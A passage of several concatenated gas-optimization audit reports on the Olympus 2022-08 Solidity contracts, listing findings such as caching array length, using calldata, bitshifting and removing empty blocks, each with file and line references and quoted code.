_config.cushionDebtBuffer = debtBuffer_;         _config.cushionDepositInterval = depositInterval_;          emit CushionParamsChanged(duration_, debtBuffer_, depositInterval_);     }      /// @inheritdoc IOperator     function setReserveFactor(uint32 reserveFactor_) external onlyRole("operator_policy") {         /// Confirm factor is within allowed values         if (reserveFactor_ > 10000 || reserveFactor_ < 100) revert Operator_InvalidParams();          /// Set factor         _config.reserveFactor = reserveFactor_;          emit ReserveFactorChanged(reserveFactor_);     }      /// @inheritdoc IOperator     function setRegenParams(         uint32 wait_,         uint32 threshold_,         uint32 observe_     ) external onlyRole("operator_policy") {         /// Confirm regen parameters are within allowed values         if (wait_ < 1 hours || threshold_ > observe_ || observe_ == 0)             revert Operator_InvalidParams();          /// Set regen params         _config.regenWait = wait_;         _config.regenThreshold = threshold_;         _config.regenObserve = observe_;          /// Re-initialize regen structs with new values (except for last regen)         _status.high.count = 0;         _status.high.nextObservation = 0;         _status.high.observations = new bool[](observe_);          _status.low.count = 0;         _status.low.nextObservation = 0;         _status.low.observations = new bool[](observe_);          emit RegenParamsChanged(wait_, threshold_, observe_);     }      /// @inheritdoc IOperator     function setBondContracts(IBondAuctioneer auctioneer_, IBondCallback callback_)         external         onlyRole("operator_admin")     {         if (address(auctioneer_) == address(0) || address(callback_) == address(0))             revert Operator_InvalidParams();         /// Set contracts         auctioneer = auctioneer_;         callback = callback_;     }      /// @inheritdoc IOperator     function initialize() external onlyRole("operator_admin") {         /// Can only call once         if (initialized) revert Operator_AlreadyInitialized();          /// Request approval for reserves from TRSRY         TRSRY.setApprovalFor(address(this), reserve, type(uint256).max);          /// Update range prices (wall and cushion)         _updateRangePrices();          /// Regenerate sides         _regenerate(true);         _regenerate(false);          /// Set initialized and active flags         initialized = true;         active = true;     }      /// @inheritdoc IOperator     function regenerate(bool high_) external onlyRole("operator_admin") {         /// Regenerate side         _regenerate(high_);     }      /// @inheritdoc IOperator     function toggleActive() external onlyRole("operator_admin") {`   7. File: 2022-08-olympus/src/policies/BondCallback.sol (line 152):     ` function batchToTreasury(ERC20[] memory tokens_) external onlyRole("callback_admin") {`      8. File: 2022-08-olympus/src/policies/BondCallback.sol (line 190):     `function setOperator(Operator operator_) external onlyRole("callback_admin") {`         9. File: 2022-08-olympus/src/policies/Heart.sol (line 130-152):     ` function resetBeat() external onlyRole("heart_admin") {         lastBeat = block.timestamp - frequency();     }      /// @inheritdoc IHeart     function toggleBeat() external onlyRole("heart_admin") {         active = !active;     }      /// @inheritdoc IHeart     function setRewardTokenAndAmount(ERC20 token_, uint256 reward_)         external         onlyRole("heart_admin")     {         rewardToken = token_;         reward = reward_;         emit RewardUpdated(token_, reward_);     }      /// @inheritdoc IHeart     function withdrawUnspentRewards(ERC20 token_) external onlyRole("heart_admin") {         token_.safeTransfer(msg.sender, token_.balanceOf(address(this)));     }`  10. File: 2022-08-olympus/src/policies/PriceConfig.sol (line 45-74):     `    function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)         external         onlyRole("price_admin")     {         PRICE.initialize(startObservations_, lastObservationTime_);     }      /// @notice                         Change the moving average window (duration)     /// @param movingAverageDuration_   Moving average duration in seconds, must be a multiple of observation frequency     /// @dev Setting the window to a larger number of observations than the current window will clear     ///      the data in the current window and require the initialize function to be called again.     ///      Ensure that you have saved the existing data and can re-populate before calling this     ///      function with a number of observations larger than have been recorded.     function changeMovingAverageDuration(uint48 movingAverageDuration_)         external         onlyRole("price_admin")     {         PRICE.changeMovingAverageDuration(movingAverageDuration_);     }      /// @notice   Change the observation frequency of the moving average (i.e. how often a new observation is taken)     /// @param    observationFrequency_   Observation frequency in seconds, must be a divisor of the moving average duration     /// @dev      Changing the observation frequency clears existing observation data since it will not be taken at the right time intervals.     ///           Ensure that you have saved the existing data and/or can re-populate before calling this function.     function changeObservationFrequency(uint48 observationFrequency_)         external         onlyRole("price_admin")     {         PRICE.changeObservationFrequency(observationFrequency_);     }`   11. File: 2022-08-olympus/src/policies/VoterRegistration.sol (line 45-56):     `    function issueVotesTo(address wallet_, uint256 amount_) external onlyRole("voter_admin") {         // Issue the votes in the VOTES module         VOTES.mintTo(wallet_, amount_);     }      /// @notice Burn votes from a wallet     /// @param  wallet_ - The address losing the votes.     /// @param  amount_ - The amount of votes to burn from the wallet.     function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole("voter_admin") {         // Revoke the votes in the VOTES module         VOTES.burnFrom(wallet_, amount_);     }`       # [G-07] Bitshift for divide by 2 (When multiply or dividing by a power of two, it is cheaper to bitshift than to use standard math operations.):    1. File: 2022-08-olympus/src/policies/Operator.sol (line 372):     `int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);`  2. File: 2022-08-olympus/src/policies/Operator.sol (line 427):     `int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);`      # [G-08] Use simple comparison in trinary logic (The comparison operators >= and <= use more gas than >,  <, or ==. Replacing the  >= and ≤ operators with a comparison  operator that has an opcode in the EVM saves gas):    1. File: 2022-08-olympus/src/policies/Operator.sol (line 210-218):     `           uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&             _status.high.count >= config_.regenThreshold         ) {             _regenerate(true);         }         if (             uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&             _status.low.count >= config_.regenThreshold         ) {`    # [G-09] Use calldata instead of memory for function parameters (Use calldata instead of memory for function parameters. Having function arguments use calldata instead of memory can save gas.):    1. File: 2022-08-olympus/src/modules/PRICE.sol (line 205-208):     ` function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)         external         permissioned     {`  2. File: 2022-08-olympus/src/policies/BondCallback.sol (line 152):     `function batchToTreasury(ERC20[] memory tokens_) external onlyRole("callback_admin") {`  3. File: 2022-08-olympus/src/policies/PriceConfig.sol (line 45):     `function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)`  4. File: 2022-08-olympus/src/policies/Operator.sol (line 195):     `function operate() external override onlyWhileActive onlyRole("operator_operate") {`         # [G-10]  Amounts should be checked for 0 before calling a transfer (Checking non-zero transfer values can avoid an expensive external call and save gas.  While this is done at some places, it’s not consistently done in the solution.):    1. File: 2022-08-olympus/src/modules/TRSRY.sol (line 82):     `token_.safeTransfer(to_, amount_);`  2. File: 2022-08-olympus/src/modules/TRSRY.sol (line 99):     `token_.safeTransfer(msg.sender, amount_);`  3. File: 2022-08-olympus/src/modules/TRSRY.sol (line 110):     `token_.safeTransferFrom(msg.sender, address(this), amount_);`  4. File: 2022-08-olympus/src/policies/Operator.sol (line 299):     `ohm.safeTransferFrom(msg.sender, address(this), amountIn_);`         5. File: 2022-08-olympus/src/policies/Operator.sol (line 330):     `reserve.safeTransferFrom(msg.sender, address(TRSRY), amountIn_);`  6. File: 2022-08-olympus/src/policies/BondCallback.sol (line 124):     `payoutToken.safeTransfer(msg.sender, outputAmount_);`  7. File: 2022-08-olympus/src/policies/BondCallback.sol (line 159):     `token.safeTransfer(address(TRSRY), balance);`   8. File: 2022-08-olympus/src/policies/Heart.sol (line 112):     `rewardToken.safeTransfer(to_, reward);`  9. File: 2022-08-olympus/src/policies/Heart.sol (line 151):     `token_.safeTransfer(msg.sender, token_.balanceOf(address(this)));`   10. File: 2022-08-olympus/src/policies/Governance.sol (line 259):     `VOTES.transferFrom(msg.sender, address(this), userVotes);`  11. File: 2022-08-olympus/src/policies/Governance.sol (line 312):     `VOTES.transferFrom(address(this), msg.sender, userVotes);`                    # [G-11]  Using `bools` for storage incurs overhead.  While this is done at some places, it’s not consistently done in the solution.):    1. File: 2022-08-olympus/src/Kernel.sol (line 113):     `bool public isActive;`  2. File: 2022-08-olympus/src/Kernel.sol (line 197):     `mapping(Role => bool) public isRole;`  3. File: 2022-08-olympus/src/modules/PRICE.sol (line 62):     `bool public initialized;`  4. File: 2022-08-olympus/src/policies/Operator.sol (line 63):     `bool public initialized;`         5. File: 2022-08-olympus/src/policies/Operator.sol (line 66):     `bool public active;`  6. File: 2022-08-olympus/src/policies/BondCallback.sol (line 24):     `mapping(address => mapping(uint256 => bool)) public approvedMarkets;`  7. File: 2022-08-olympus/src/policies/Heart.sol (line 33):     `bool public active;`  8. File: 2022-08-olympus/src/policies/Governance.sol (line 105):     `mapping(uint256 => bool) public proposalHasBeenActivated;`  9. File: 2022-08-olympus/src/policies/Governance.sol (line 117):     `mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal;  `      # [G-12]  Using `private` rather than `public` for constants, saves gas (If needed, the value can be read from the verified contract source  code. Savings are due to the compiler not having to create non-payable  getter functions for deployment calldata, and not adding another entry  to the method ID table):    1. File: 2022-08-olympus/src/modules/RANGE.sol (line 65):     `uint256 public constant FACTOR_SCALE = 1e4;`  2. File: 2022-08-olympus/src/modules/PRICE.sol (line 59):     `uint8 public constant decimals = 18;`  3. File: 2022-08-olympus/src/policies/Operator.sol (line 89):     `uint32 public constant FACTOR_SCALE = 1e4;`  4. File: 2022-08-olympus/src/policies/Governance.sol (line 121-137):     `    uint256 public constant SUBMISSION_REQUIREMENT = 100;      /// @notice Amount of time a submitted proposal has to activate before it expires.     uint256 public constant ACTIVATION_DEADLINE = 2 weeks;      /// @notice Amount of time an activated proposal must stay up before it can be replaced by a new activated proposal.     uint256 public constant GRACE_PERIOD = 1 weeks;      /// @notice Endorsements required to activate a proposal as percentage of total supply.     uint256 public constant ENDORSEMENT_THRESHOLD = 20;      /// @notice Net votes required to execute a proposal on chain as a percentage of total supply.     uint256 public constant EXECUTION_THRESHOLD = 33;      /// @notice Required time for a proposal to be active before it can be executed.     /// @dev    This amount should be greater than 0 to prevent flash loan attacks.     uint256 public constant EXECUTION_TIMELOCK = 3 days;`             # [G-13]  Empty blocks should be removed or emit something [The code should be refactored such that they no longer exist, or the  block should do something useful, such as emitting an event or  reverting. If the contract is meant to be extended, the contract should  be `abstract` and the function signatures be added without  any default implementation. If the block is an empty if-statement block  to avoid doing subsequent checks in the else-if/else conditions, the  else-if/else conditions should be nested under the negation of the  if-statement, because they involve different classes of checks, which  may lead to the introduction of errors when the code is later modified (`if(x){}else if(y){...}else{...}` => `if(!x){if(y){...}else{...}}`)]:    1. File: 2022-08-olympus/src/Kernel.sol (line 85):     `constructor(Kernel kernel_) KernelAdapter(kernel_) {}`  2. File: 2022-08-olympus/src/Kernel.sol (line 95):     `function KEYCODE() public pure virtual returns (Keycode) {}`  3. File: 2022-08-olympus/src/Kernel.sol (line 100):     `function VERSION() external pure virtual returns (uint8 major, uint8 minor) {};`  4. File: 2022-08-olympus/src/Kernel.sol (line 105):     ` function INIT() external virtual onlyKernel {}`         5. File: 2022-08-olympus/src/Kernel.sol (line 115):     `constructor(Kernel kernel_) KernelAdapter(kernel_) {}`  6. File: 2022-08-olympus/src/Kernel.sol (line 139-143):     `    function configureDependencies() external virtual returns (Keycode[] memory dependencies) {}      /// @notice Function called by kernel to set module function permissions.     /// @return requests - Array of keycodes and function selectors for requested permissions.     function requestPermissions() external view virtual returns (Permissions[] memory requests) {}`       7. File: 2022-08-olympus/src/modules/TRSRY.sol (line 45):     `constructor(Kernel kernel_) Module(kernel_) {}`  8. File: 2022-08-olympus/src/modules/VOTES.sol (line 19):     `{}`  9. File: 2022-08-olympus/src/modules/INSTR.sol (line 20):     `constructor(Kernel kernel_) Module(kernel_) {}`  10. File: 2022-08-olympus/src/policies/TreasuryCustodian.sol (line 24):     `constructor(Kernel kernel_) Policy(kernel_) {}`         11. File: 2022-08-olympus/src/policies/PriceConfig.sol (line 15):     `constructor(Kernel kernel_) Policy(kernel_) {}`  12. File: 2022-08-olympus/src/policies/Governance.sol (line 59):     `constructor(Kernel kernel_) Policy(kernel_) {}`           13. File: 2022-08-olympus/src/policies/VoterRegistration.sol (line 16):     `constructor(Kernel kernel_) Policy(kernel_) {}`  
## Unnecessary equals boolean   Boolean variables can be checked within conditionals directly without the use of equality operators to true/false.  ### Code instances:          Governance.sol, 223: if (proposalHasBeenActivated[proposalId_] == true) {         Governance.sol, 306: if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {         Operator.sol, 355: if (id_ == RANGE.market(false)) {         Operator.sol, 351: if (id_ == RANGE.market(true)) {    ## Change transferFrom to transfer  'transferFrom(address(this), *, **)' could be replaced by the following more gas efficient 'transfer(*, **)'                This replacement is more gas efficient and improves the code quality.  ### Code instance:          Governance.sol, 312 : VOTES.transferFrom(address(this), msg.sender, userVotes);    ## Caching array length can save gas   Caching the array length is more gas efficient. This is because access to a local variable in solidity is more efficient than query storage / calldata / memory. We recommend to change from:          for (uint256 i=0; i<array.length; i++) { ... }  to:       uint len = array.length       for (uint256 i=0; i<len; i++) { ... }   ### Code instance:          Governance.sol, instructions, 278    ## Unnecessary index init   In for loops you initialize the index to start from 0, but it already initialized to 0 in default and this assignment cost gas.  It is more clear and gas efficient to declare without assigning 0 and will have the same meaning:  ### Code instance:          Kernel.sol, 397    ## Storage double reading. Could save SLOAD  Reading a storage variable is gas costly (SLOAD). In cases of multiple read of a storage variable in the same scope, caching the first read (i.e saving as a local variable) can save gas and decrease the  overall gas uses. The following is a list of functions and the storage variables that you read twice:   ### Code instance:          PRICE.sol: nextObsIndex is read twice in getLastPrice    ## Rearrange state variables  You can change the order of the storage variables to decrease memory uses.  ### Code instance:  In Operator.sol,rearranging the storage fields can optimize to: 11 slots from: 13 slots. The new order of types (you choose the actual variables):         1. Status         2. Config         3. OlympusPrice         4. OlympusRange         5. OlympusTreasury         6. OlympusMinter         7. IBondAuctioneer         8. IBondCallback         9. ERC20         10. ERC20         11. uint32         12. uint8         13. uint8         14. bool         15. bool     ## Use bytes32 instead of string to save gas whenever possible       Use bytes32 instead of string to save gas whenever possible.     String is a dynamic data structure and therefore is more gas consuming then bytes32.       ### Code instance:          OlympusERC20.sol (L39), string internal UNAUTHORIZED = "UNAUTHORIZED";     ## Use != 0 instead of > 0   Using != 0 is slightly cheaper than > 0. (see https://github.com/code-423n4/2021-12-maple-findings/issues/75 for similar issue)   ### Code instance:          FullMath.sol, 35: change 'denominator > 0' to 'denominator != 0'    ## Unnecessary cast        ### Code instances:          Role Kernel.sol.grantRole - unnecessary casting Role(role_)         Kernel Kernel.sol._migrateKernel - unnecessary casting Kernel(newKernel_)    ## Use unchecked to save gas for certain additive calculations that cannot overflow   You can use unchecked in the following calculations since there is no risk to overflow:  ### Code instances:          Operator.sol (L#209) - if ( uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&         Operator.sol (L#215) - if ( uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&         Operator.sol (L#395) - payoutToken: ohm, quoteToken: reserve, callbackAddr: address(callback), capacityInQuote: false, capacity: marketCapacity, formattedInitialPrice: initialPrice, formattedMinimumPrice: minimumPrice, debtBuffer: config_.cushionDebtBuffer, vesting: uint48(0), conclusion: uint48(block.timestamp + config_.cushionDuration), depositInterval: config_.cushionDepositInterval, scaleAdjustment: scaleAdjustment         Governance.sol (L#212) - if (block.timestamp > proposal.submissionTimestamp + ACTIVATION_DEADLINE) {         Heart.sol (L#94) - if (block.timestamp < lastBeat + frequency()) revert Heart_OutOfCycle();          Operator.sol (L#447) - payoutToken: reserve, quoteToken: ohm, callbackAddr: address(callback), capacityInQuote: false, capacity: marketCapacity, formattedInitialPrice: initialPrice, formattedMinimumPrice: minimumPrice, debtBuffer: config_.cushionDebtBuffer, vesting: uint48(0), conclusion: uint48(block.timestamp + config_.cushionDuration), depositInterval: config_.cushionDepositInterval, scaleAdjustment: scaleAdjustment         Governance.sol (L#272) - if (block.timestamp < activeProposal.activationTimestamp + EXECUTION_TIMELOCK) {         Governance.sol (L#227) - if (block.timestamp < activeProposal.activationTimestamp + GRACE_PERIOD) {    ## Inline one time use functions   The following functions are used exactly once. Therefore you can inline them and save gas and improve code clearness.       ### Code instances:          Kernel.sol, _upgradeModule         Kernel.sol, _activatePolicy         Kernel.sol, _reconfigurePolicies         FullMath.sol, mulDiv         Kernel.sol, _deactivatePolicy         Operator.sol, _addObservation         Kernel.sol, _pruneFromDependents         Kernel.sol, _migrateKernel         Kernel.sol, _installModule    ## Cache powers of 10 used several times  You calculate the power of 10 every time you use it instead of caching it once as a constant variable and using it instead.  Fix the following code lines:   ### Code instances:  Operator.sol, 374 : You should cache the used power of 10 as constant state variable since it's used several times (2):              uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);  Operator.sol, 419 : You should cache the used power of 10 as constant state variable since it's used several times (2):              uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price;  Operator.sol, 783 : You should cache the used power of 10 as constant state variable since it's used several times (3):                      10**ohmDecimals * 10**PRICE.decimals(),  Operator.sol, 784 : You should cache the used power of 10 as constant state variable since it's used several times (3):                      10**reserveDecimals * RANGE.price(true, true)  Operator.sol, 752 : You should cache the used power of 10 as constant state variable since it's used several times (3):                  10**reserveDecimals * RANGE.price(true, false),  Operator.sol, 764 : You should cache the used power of 10 as constant state variable since it's used several times (3):                  10**reserveDecimals * RANGE.price(true, true)  Operator.sol, 763 : You should cache the used power of 10 as constant state variable since it's used several times (3):                  10**ohmDecimals * 10**PRICE.decimals(),  Operator.sol, 753 : You should cache the used power of 10 as constant state variable since it's used several times (3):                  10**ohmDecimals * 10**PRICE.decimals()  Operator.sol, 429 : You should cache the used power of 10 as constant state variable since it's used several times (2):              uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);  Operator.sol, 418 : You should cache the used power of 10 as constant state variable since it's used several times (2):              uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price;     ## Upgrade pragma to at least 0.8.4   Using newer compiler versions and the optimizer gives gas optimizations and additional safety checks are available for free.  The advantages of versions 0.8.* over <0.8.0 are:          1. Safemath by default from 0.8.0 (can be more gas efficient than library based safemath.)         2. Low level inliner : from 0.8.2, leads to cheaper runtime gas. Especially relevant when the contract has small functions. For example, OpenZeppelin libraries typically have a lot of small helper functions and if they are not inlined, they cost an additional 20 to 40 gas because of 2 extra jump instructions and additional stack operations needed for function calls.         3. Optimizer improvements in packed structs: Before 0.8.3, storing packed structs, in some cases used an additional storage read operation. After EIP-2929, if the slot was already cold, this means unnecessary stack operations and extra deploy time costs. However, if the slot was already warm, this means additional cost of 100 gas alongside the same unnecessary stack operations and extra deploy time costs.         4. Custom errors from 0.8.4, leads to cheaper deploy time cost and run time cost. Note: the run time cost is only relevant when the revert condition is met. In short, replace revert strings by custom errors.      ### Code instance:          OlympusERC20.sol    ## Do not cache msg.sender   We recommend not to cache msg.sender since calling it is 2 gas while reading a variable is more.   ### Code instance:          https://github.com/code-423n4/2022-08-olympus/tree/main/src/Kernel.sol#L219  
# gas optimization  ### Don't Initialize Variables with Default Value  ### examples ``` 2022-08-olympus\src\Kernel.sol::397 => for (uint256 i = 0; i < reqLength; ) { 2022-08-olympus\src\utils\KernelUtils.sol::43 => for (uint256 i = 0; i < 5; ) { 2022-08-olympus\src\utils\KernelUtils.sol::58 => for (uint256 i = 0; i < 32; ) { ```  ### Use != 0 instead of > 0 for Unsigned Integer Comparison  ### examples ``` 2022-08-olympus\src\policies\Governance.sol::247 => if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) { 2022-08-olympus\src\utils\KernelUtils.sol::46 => if (char < 0x41 || char > 0x5A) revert InvalidKeycode(keycode_); // A-Z only 2022-08-olympus\src\utils\KernelUtils.sol::60 => if ((char < 0x61 || char > 0x7A) && char != 0x5f && char != 0x00) { ```  ### Long Revert Strings  ### examples ``` 2022-08-olympus\src\modules\PRICE.sol::4 => import {AggregatorV2V3Interface} from "interfaces/AggregatorV2V3Interface.sol"; 2022-08-olympus\src\modules\TRSRY.sol::5 => import {ReentrancyGuard} from "solmate/utils/ReentrancyGuard.sol"; 2022-08-olympus\src\modules\VOTES.sol::18 => ERC20("OlympusDAO Dummy Voting Tokens", "VOTES", 0) 2022-08-olympus\src\policies\BondCallback.sol::5 => import {ReentrancyGuard} from "solmate/utils/ReentrancyGuard.sol"; 2022-08-olympus\src\policies\Heart.sol::4 => import {ReentrancyGuard} from "solmate/utils/ReentrancyGuard.sol"; 2022-08-olympus\src\policies\Heart.sol::7 => import {IOperator} from "policies/interfaces/IOperator.sol"; 2022-08-olympus\src\policies\Operator.sol::4 => import {ReentrancyGuard} from "solmate/utils/ReentrancyGuard.sol"; 2022-08-olympus\src\policies\Operator.sol::7 => import {IOperator} from "policies/interfaces/IOperator.sol"; ```  ### Use Shift Right/Left instead of Division/Multiplication if possible  ### examples ``` 2022-08-olympus\src\interfaces\IBondAuctioneer.sol::41 => /// @dev                        Should be calculated as: (payoutDecimals - quoteDecimals) - ((payoutPriceDecimals - quotePriceDecimals) / 2) 2022-08-olympus\src\policies\Operator.sol::372 => int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2); 2022-08-olympus\src\policies\Operator.sol::419 => uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price; 2022-08-olympus\src\policies\Operator.sol::420 => uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price; 2022-08-olympus\src\policies\Operator.sol::427 => int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2); 2022-08-olympus\src\policies\Operator.sol::786 => ) * (FACTOR_SCALE + RANGE.spread(true) * 2)) / ``` 
## [G-01] Don't Initialize Variables with Default Value  Uninitialized variables are assigned with the types default value. Explicitly initializing a variable with it's default value costs unnecesary gas.  ``` 2022-08-olympus/src/Kernel.sol::397 => for (uint256 i = 0; i < reqLength; ) { 2022-08-olympus/src/utils/KernelUtils.sol::43 => for (uint256 i = 0; i < 5; ) { 2022-08-olympus/src/utils/KernelUtils.sol::58 => for (uint256 i = 0; i < 32; ) { ```  ## [G-02] Cache Array Length Outside of Loop  Caching the array length outside a loop saves reading it on each iteration, as long as the array's length is not changed during the loop.  ``` 2022-08-olympus/src/policies/Governance.sol::278 => for (uint256 step; step < instructions.length; ) { ```  ## [G-03] Use Shift Right/Left instead of Division/Multiplication if possible  A division/multiplication by any number x being a power of 2 can be calculated by shifting log2(x) to the right/left.  While the DIV opcode uses 5 gas, the SHR opcode only uses 3 gas. Furthermore, Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting.  ``` 2022-08-olympus/src/policies/Operator.sol::372 => int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2); 2022-08-olympus/src/policies/Operator.sol::419 => uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price; 2022-08-olympus/src/policies/Operator.sol::420 => uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price; 2022-08-olympus/src/policies/Operator.sol::427 => int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2); ```  ## [G-04] Using private rather than public for constants, saves gas  If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table  ``` 2022-08-olympus/src/modules/MINTR.sol::9 => OHM public immutable ohm; 2022-08-olympus/src/modules/RANGE.sol::68 => ERC20 public immutable ohm; 2022-08-olympus/src/modules/RANGE.sol::71 => ERC20 public immutable reserve; 2022-08-olympus/src/policies/Operator.sol::82 => ERC20 public immutable ohm; 2022-08-olympus/src/policies/Operator.sol::83 => uint8 public immutable ohmDecimals; 2022-08-olympus/src/policies/Operator.sol::85 => ERC20 public immutable reserve; 2022-08-olympus/src/policies/Operator.sol::86 => uint8 public immutable reserveDecimals; ```  ## [G-05] Functions guaranteed to revert when called by normal users can be marked payable  If a function modifier such as onlyOwner is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are CALLVALUE(2),DUP1(3),ISZERO(3),PUSH2(3),JUMPI(10),PUSH1(3),DUP1(3),REVERT(0),JUMPDEST(1),POP(2), which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost  ``` 2022-08-olympus/src/Kernel.sol::76 => function changeKernel(Kernel newKernel_) external onlyKernel { 2022-08-olympus/src/Kernel.sol::105 => function INIT() external virtual onlyKernel {} 2022-08-olympus/src/Kernel.sol::126 => function setActiveStatus(bool activate_) external onlyKernel { 2022-08-olympus/src/Kernel.sol::235 => function executeAction(Actions action_, address target_) external onlyExecutor { 2022-08-olympus/src/Kernel.sol::439 => function grantRole(Role role_, address addr_) public onlyAdmin { 2022-08-olympus/src/Kernel.sol::451 => function revokeRole(Role role_, address addr_) public onlyAdmin { 2022-08-olympus/src/policies/BondCallback.sol::152 => function batchToTreasury(ERC20[] memory tokens_) external onlyRole("callback_admin") { 2022-08-olympus/src/policies/BondCallback.sol::190 => function setOperator(Operator operator_) external onlyRole("callback_admin") { 2022-08-olympus/src/policies/Heart.sol::130 => function resetBeat() external onlyRole("heart_admin") { 2022-08-olympus/src/policies/Heart.sol::135 => function toggleBeat() external onlyRole("heart_admin") { 2022-08-olympus/src/policies/Heart.sol::150 => function withdrawUnspentRewards(ERC20 token_) external onlyRole("heart_admin") { 2022-08-olympus/src/policies/Operator.sol::195 => function operate() external override onlyWhileActive onlyRole("operator_operate") { 2022-08-olympus/src/policies/Operator.sol::510 => function setThresholdFactor(uint256 thresholdFactor_) external onlyRole("operator_policy") { 2022-08-olympus/src/policies/Operator.sol::516 => function setCushionFactor(uint32 cushionFactor_) external onlyRole("operator_policy") { 2022-08-olympus/src/policies/Operator.sol::548 => function setReserveFactor(uint32 reserveFactor_) external onlyRole("operator_policy") { 2022-08-olympus/src/policies/Operator.sol::618 => function regenerate(bool high_) external onlyRole("operator_admin") { 2022-08-olympus/src/policies/Operator.sol::624 => function toggleActive() external onlyRole("operator_admin") { 2022-08-olympus/src/policies/VoterRegistration.sol::45 => function issueVotesTo(address wallet_, uint256 amount_) external onlyRole("voter_admin") { 2022-08-olympus/src/policies/VoterRegistration.sol::53 => function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole("voter_admin") { ```  ## [G-06] Empty blocks should be removed or emit something  The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting.   ``` 2022-08-olympus/src/Kernel.sol::85 => constructor(Kernel kernel_) KernelAdapter(kernel_) {} 2022-08-olympus/src/Kernel.sol::95 => function KEYCODE() public pure virtual returns (Keycode) {} 2022-08-olympus/src/Kernel.sol::100 => function VERSION() external pure virtual returns (uint8 major, uint8 minor) {} 2022-08-olympus/src/Kernel.sol::105 => function INIT() external virtual onlyKernel {} 2022-08-olympus/src/Kernel.sol::115 => constructor(Kernel kernel_) KernelAdapter(kernel_) {} 2022-08-olympus/src/Kernel.sol::139 => function configureDependencies() external virtual returns (Keycode[] memory dependencies) {} 2022-08-olympus/src/Kernel.sol::143 => function requestPermissions() external view virtual returns (Permissions[] memory requests) {} 2022-08-olympus/src/modules/INSTR.sol::20 => constructor(Kernel kernel_) Module(kernel_) {} 2022-08-olympus/src/modules/TRSRY.sol::45 => constructor(Kernel kernel_) Module(kernel_) {} 2022-08-olympus/src/modules/VOTES.sol::19 => {} 2022-08-olympus/src/policies/Governance.sol::59 => constructor(Kernel kernel_) Policy(kernel_) {} 2022-08-olympus/src/policies/PriceConfig.sol::15 => constructor(Kernel kernel_) Policy(kernel_) {} 2022-08-olympus/src/policies/TreasuryCustodian.sol::24 => constructor(Kernel kernel_) Policy(kernel_) {} 2022-08-olympus/src/policies/VoterRegistration.sol::16 => constructor(Kernel kernel_) Policy(kernel_) {} ```  ## [G-07] Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead  When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.  ``` 2022-08-olympus/src/modules/PRICE.sol::44 => uint32 public nextObsIndex; 2022-08-olympus/src/modules/PRICE.sol::47 => uint32 public numObservations; 2022-08-olympus/src/modules/PRICE.sol::59 => uint8 public constant decimals = 18; 2022-08-olympus/src/modules/PRICE.sol::84 => uint8 ohmEthDecimals = _ohmEthPriceFeed.decimals(); 2022-08-olympus/src/modules/PRICE.sol::87 => uint8 reserveEthDecimals = _reserveEthPriceFeed.decimals(); 2022-08-olympus/src/modules/PRICE.sol::127 => uint32 numObs = numObservations; 2022-08-olympus/src/modules/PRICE.sol::185 => uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1; 2022-08-olympus/src/policies/Operator.sol::83 => uint8 public immutable ohmDecimals; 2022-08-olympus/src/policies/Operator.sol::86 => uint8 public immutable reserveDecimals; 2022-08-olympus/src/policies/Operator.sol::89 => uint32 public constant FACTOR_SCALE = 1e4; 2022-08-olympus/src/policies/Operator.sol::485 => int8 decimals; 2022-08-olympus/src/policies/Operator.sol::665 => uint32 observe = _config.regenObserve; 2022-08-olympus/src/policies/interfaces/IOperator.sol::13 => uint32 cushionFactor; // percent of capacity to be used for a single cushion deployment, assumes 2 decimals (i.e. 1000 = 10%) 2022-08-olympus/src/policies/interfaces/IOperator.sol::14 => uint32 cushionDuration; // duration of a single cushion deployment in seconds 2022-08-olympus/src/policies/interfaces/IOperator.sol::15 => uint32 cushionDebtBuffer; // Percentage over the initial debt to allow the market to accumulate at any one time. Percent with 3 decimals, e.g. 1_000 = 1 %. See IBondAuctioneer for more info. 2022-08-olympus/src/policies/interfaces/IOperator.sol::16 => uint32 cushionDepositInterval; // Target frequency of deposits. Determines max payout of the bond market. See IBondAuctioneer for more info. 2022-08-olympus/src/policies/interfaces/IOperator.sol::17 => uint32 reserveFactor; // percent of reserves in treasury to be used for a single wall, assumes 2 decimals (i.e. 1000 = 10%) 